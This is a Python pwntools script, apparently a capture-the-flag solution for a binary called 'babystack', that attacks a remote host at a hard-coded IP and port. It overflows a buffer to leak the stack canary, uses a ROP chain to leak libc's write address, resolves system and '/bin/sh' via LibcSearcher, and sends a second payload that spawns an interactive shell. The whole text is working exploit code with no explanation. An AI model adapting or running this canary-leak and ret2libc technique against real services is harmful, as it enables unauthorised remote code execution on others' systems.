from pwn import *
from LibcSearcher import *

context(log_level="debug", arch="amd64", os="linux")
# r = process("./babystack")
r = remote("111.200.241.244", 55109)

elf = ELF("./babystack")
pop_rdi = 0x400a93
main = 0x400908

r.recvuntil(b">> ")
r.sendline(b"1")
junk = cyclic(0x88)
r.sendline(junk)
r.recvuntil(b">> ")
r.sendline(b"2")
canary = r.recv()[0x88:0x90]
canary = b"\x00" + canary[1:]
log.debug("canary: " + hex(u64(canary)))
r.recvuntil(b">> ")
r.sendline(b"1")
payload1 = junk + canary + cyclic(0x8)
payload1 += p64(pop_rdi) + p64(elf.got["write"]) + p64(elf.plt["puts"]) + p64(main)
r.sendline(payload1)
r.recvuntil(b">> ")

r.sendline(b"3")
write = u64(r.recv(8).ljust(8, b"\x00"))
log.debug("libc_write: " + hex(write))
libc = LibcSearcher("write", write)
libc_base = write - libc.dump("write")
system = libc_base + libc.dump("system")
bin_sh = libc_base + libc.dump("str_bin_sh")

payload2 = junk + canary + cyclic(0x8)
payload2 += p64(pop_rdi) + p64(bin_sh) + p64(system)
r.sendline(b"1")
r.sendline(payload2)
r.recvuntil(b">> ")
sleep(1)
r.sendline(b"3")
r.interactive()

# 0x0000000000400a93: pop rdi; ret;